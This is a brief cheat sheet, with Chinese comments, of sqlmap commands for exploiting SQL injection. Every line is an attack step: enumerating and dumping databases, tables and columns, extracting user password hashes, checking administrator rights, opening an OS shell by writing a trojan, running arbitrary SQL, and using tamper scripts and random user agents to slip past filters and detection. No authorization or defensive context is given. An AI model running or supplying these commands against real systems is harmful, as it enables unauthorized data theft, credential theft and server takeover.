# sqlmap demoes

```shell
# -m 批量扫描 —batch 全部采用默认行为，不向用户请求y/n,并且使用随机的user—agnet
sqlmap -m temp2.txt --batch --random-agent> result.txt
# 尝试获取所有数据库名
sqlmap -u url --dbs —-random-agent --batch
# 获取表名
sqlmap -u url —D 数据库名 --tables —-random-agent --batch
# 获取表中字段名
sqlmap -u url -D 数据库名 -T 表名 --columns  --random-agent --batch
# 获取字段内容
sqlmap -u url -D 数据库名 -T 表名 -C 字段名(以逗号分隔) --dump --random-agent
# 尝试获取所有用户:
sqlmap -u url --users --random-agent --batch
# 尝试获取账号密码:(select user,authentication_string from mysql.user;) 密码使用mysql5进行hash
sqlmap -u url --password --random-agent --batch
# 尝试获取当前用户:
sqlmap -u url --current-user --random-agent --batch
# 获取当前数据库
sqlmap -u url --current-db 
# 测试当前用户权限:
sqlmap -u url --is-dba --random-agent --batch
# 尝试写入木马,getshell
sqlmap -u url --os-shell --random-agent --batch
# 执行指定的sql语句
sqlmap -u url -v 1 --sql-query 'select top 20 * from City'
# 读取原生http报文(可用来测试http报头中其他字段的是否存在注入，比如：cookie注入，X-Forwarded-For注入)
sqlmap -r raw.txt
# 显示所有绕过脚本
sqlmap --list-tampers
sqlmap -m temp2.txt --batch --random-agent --tamper  xforwardedfor.py,greatest.py,equaltorlike.py,equaltolike.py,sleep2getlock.py,space2comment.py
```

